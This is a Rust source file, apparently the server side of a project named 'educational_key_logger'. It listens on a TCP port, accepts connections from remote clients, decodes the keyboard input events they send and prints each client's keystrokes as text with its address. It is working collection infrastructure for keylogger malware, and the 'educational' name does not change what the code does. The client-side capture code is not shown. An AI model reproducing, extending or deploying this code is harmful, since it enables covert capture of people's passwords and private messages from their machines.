mod parser;
use educational_key_logger::IP_PORT;
use educational_key_logger::input::InputEvent;
use log::{error, info, warn};
use parser::input_events_to_text;
use std::error::Error;
use std::io::{self, Read, Stdout};
use std::net::{TcpListener, TcpStream};
use std::sync::{Arc, Mutex};
use std::time::Duration;
use std::{fmt, thread};

const TIMEOUT_DURATION: Duration = Duration::from_secs(2);

fn main() {
    if std::env::var_os("RUST_LOG").is_none() {
        unsafe {
            std::env::set_var("RUST_LOG", "info");
        }
    }
    env_logger::init();

    let listener = match TcpListener::bind(IP_PORT) {
        Ok(listener) => listener,
        Err(err) => {
            error!("Failed to bind {}: {}", IP_PORT, err);
            return;
        }
    };
    let stdout_mutex = Arc::new(Mutex::new(io::stdout()));
    for stream_result in listener.incoming() {
        match stream_result {
            Ok(stream) => {
                let peer_addr = match stream.peer_addr() {
                    Ok(peer_addr) => peer_addr.to_string(),
                    Err(_) => "UNKNOWN".to_string(),
                };
                info!("Client connected: {}", &peer_addr);
                let stdout = stdout_mutex.clone();
                thread::spawn(move || {
                    handle_stream(stream, stdout, peer_addr);
                });
            }
            Err(e) => {
                if e.kind() == io::ErrorKind::ConnectionAborted {
                    info!("Client aborted connection attempt: {}", e);
                    continue;
                } else if e.kind() == io::ErrorKind::Interrupted {
                    info!("Accept operation interrupted: {}", e);
                    continue;
                } else {
                    error!("Fatal listener error, shutting down: {}", e);
                    break;
                }
            }
        }
    }
}

fn handle_stream(mut stream: TcpStream, stdout: Arc<Mutex<Stdout>>, peer_addr: String) {
    let mut buffer = [0; 1024];
    let mut stream_read_handler = StreamReadHandler::new(stdout.clone(), peer_addr);
    if let Err(e) = stream.set_read_timeout(Some(TIMEOUT_DURATION)) {
        error!("Failed to set read timeout: {}", e);
        return;
    }
    loop {
        match stream.read(&mut buffer) {
            Ok(0) => {
                info!("Client disconnected: {}", stream_read_handler.peer_addr);
                break;
            }
            Ok(bytes_read) => {
                if let Err(err) = stream_read_handler.read_buffer(&buffer[..bytes_read]) {
                    warn!("Failed to read buffer: {}", err);
                    warn!("Shutting down the connection");
                    drop(stream);
                    return;
                }
            }
            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {
                // TIMEOUT
                if !stream_read_handler.input_events.is_empty() {
                    stream_read_handler.handle_input_events();
                }
            }
            Err(e) => {
                error!("Read error: {}", e);
                break;
            }
        }
    }
}

struct StreamReadHandler {
    size_prefix: Option<u8>,
    /// Buffer for InputEvent. It's length can never exceed size_prefix which is sent through TCPStream.
    input_event_buffer: Vec<u8>,
    input_events: Vec<InputEvent>,
    stdout: Arc<Mutex<Stdout>>,
    peer_addr: String,
}

impl StreamReadHandler {
    pub fn new(stdout: Arc<Mutex<Stdout>>, peer_addr: String) -> StreamReadHandler {
        StreamReadHandler {
            size_prefix: None,
            input_event_buffer: vec![],
            input_events: vec![],
            stdout,
            peer_addr,
        }
    }
    pub fn read_buffer(&mut self, buffer: &[u8]) -> Result<(), InvalidEncodedInputEventError> {
        let mut buffer_index = 0;
        while buffer_index < buffer.len() {
            match self.size_prefix {
                None => {
                    self.size_prefix = Some(buffer[buffer_index]);
                    // There'll be at least 1 byte in the buffer. Since bytes_read cannot be 0.
                    debug_assert!(
                        self.input_event_buffer.len() == 0,
                        "input_event_buffer wasn't cleared."
                    );
                    buffer_index += 1;
                }
                Some(size_prefix) => {
                    debug_assert!(
                        self.input_event_buffer.len() <= u8::MAX.into(),
                        "input_event_buffer is larger than 255 ({})",
                        self.input_event_buffer.len()
                    );
                    let available_space = size_prefix as usize - self.input_event_buffer.len();
                    let will_buffer_be_full = buffer.len() - buffer_index >= available_space;
                    if will_buffer_be_full {
                        self.input_event_buffer.extend_from_slice(
                            &buffer[buffer_index..(buffer_index + available_space)],
                        );
                        buffer_index += available_space;
                        self.input_event_buffer_full()?;
                    } else {
                        self.input_event_buffer
                            .extend_from_slice(&buffer[buffer_index..]);
                    }
                }
            };
        }
        Ok(())
    }
    fn input_event_buffer_full(&mut self) -> Result<(), InvalidEncodedInputEventError> {
        self.input_events.push(
            match postcard::from_bytes::<InputEvent>(&self.input_event_buffer) {
                Ok(input_event) => {
                    if !input_event.is_key_event() {
                        return Err(InvalidEncodedInputEventError::new(
                            "InputEvent is not a key event".to_owned(),
                        ));
                    }
                    input_event
                }
                Err(_) => {
                    return Err(InvalidEncodedInputEventError::new(
                        "Encoded bytes of InputEvent was invalid.".to_owned(),
                    ));
                }
            },
        );
        self.input_event_buffer.clear();
        self.size_prefix = None;
        Ok(())
    }

    fn handle_input_events(&mut self) {
        let input_events = std::mem::take(&mut self.input_events);
        let text = input_events_to_text(&input_events);
        let _guard = self
            .stdout
            .lock()
            .expect("System should not fail to aqquire mutex.");
        if !text.is_empty() {
            println!("{}: {}", self.peer_addr, text);
        }
    }
}

#[derive(Debug, Clone)]
struct InvalidEncodedInputEventError {
    error_msg: String,
}

impl InvalidEncodedInputEventError {
    pub fn new(error_msg: String) -> Self {
        InvalidEncodedInputEventError { error_msg }
    }
}

impl fmt::Display for InvalidEncodedInputEventError {
    fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {
        write!(f, "{}", self.error_msg)
    }
}

impl Error for InvalidEncodedInputEventError {}
